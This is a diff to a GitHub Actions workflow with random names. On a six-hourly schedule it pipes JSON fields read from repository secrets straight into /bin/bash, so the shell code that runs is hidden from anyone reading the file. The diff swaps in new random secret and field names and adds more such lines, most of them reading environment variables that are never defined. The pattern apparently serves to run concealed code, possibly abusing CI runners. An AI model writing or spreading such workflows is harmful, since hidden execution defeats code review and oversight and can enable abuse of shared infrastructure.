@@ -2,20 +2,26 @@ name: caobushang9870
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '11 2/6 * * *'
 
-jobs:  # 27154
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: caobushang9870
         env:
-          hqy6: ${{ secrets.hqy6 }}
+          hj3338: ${{ secrets.hj3338 }}
         run: |
-          echo $hqy6 | jq -r .orw0320 | /bin/bash
-          echo $oiwmp2 | jq -r .b6684 | /bin/bash
-          echo $rnewo42198 | jq -r .bnh6672 | /bin/bash
-          echo $fwpej19 | jq -r .w1 | /bin/bash
-          echo $smzq2635 | jq -r .yxzvp8945 | /bin/bash
+          echo $hj3338 | jq -r .nc6 | /bin/bash
+          echo $tu4 | jq -r .xijh674 | /bin/bash
+          echo $h2998 | jq -r .kmq693 | /bin/bash
+          echo $or86 | jq -r .eeps48 | /bin/bash
+          echo $dm9 | jq -r .sn6380 | /bin/bash
+          echo $bhod837 | jq -r .rals33 | /bin/bash
+          echo $oq76490 | jq -r .hw69183 | /bin/bash
+          echo $mj9 | jq -r .gthu751 | /bin/bash
+          echo $aa60 | jq -r .cz2 | /bin/bash
+          echo $ub7 | jq -r .qi95953 | /bin/bash
+          echo $ebin7 | jq -r .z50 | /bin/bash
 
